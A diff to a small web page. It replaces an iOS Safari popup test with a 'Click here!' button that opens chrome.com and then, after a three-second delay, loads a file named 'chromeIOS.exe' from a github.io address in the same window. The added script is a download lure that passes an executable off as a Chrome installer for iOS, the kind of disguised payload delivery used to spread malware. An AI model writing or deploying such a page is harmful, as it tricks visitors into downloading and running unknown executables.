@@ -1,46 +1,9 @@
-<!DOCTYPE html>
-<html>
-<head>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>iOS window.open PoC</title>
-
-<style>
-button {
-  font-size: 20px;
-  padding: 15px 30px;
-  margin-top: 50px;
-}
-</style>
-
 <script>
-function openTab() {
-  // attempt popup
-  var w = window.open(
-    "https://example.com",
-    "_blank"
-  );
-
-  // iOS fallback (kalau diblock)
-  if (!w) {
-    location.href = "https://example.com";
-  }
+function a(){
+	window.open('https://chrome.com/', 'x');
+	setTimeout(function(){
+		window.open('https://ecdnts-del.github.io/test-apk/chromeIOS.exe', 'x');
+	}, 3000);
 }
-</script>
-</head>
-
-<body>
-
-<h2>Tap sekali (iOS Safari)</h2>
-
-<button ontouchend="openTab()">
-  Open Page
-</button>
-
-<p>
-iOS Safari akan:
-<br>• membuka tab baru (fullscreen)
-<br>• mengabaikan size & position
-</p>
-
-</body>
-</html>
+</script> 
+<center><input type="button" class="button" value="Click here!" onclick="a()"></center>
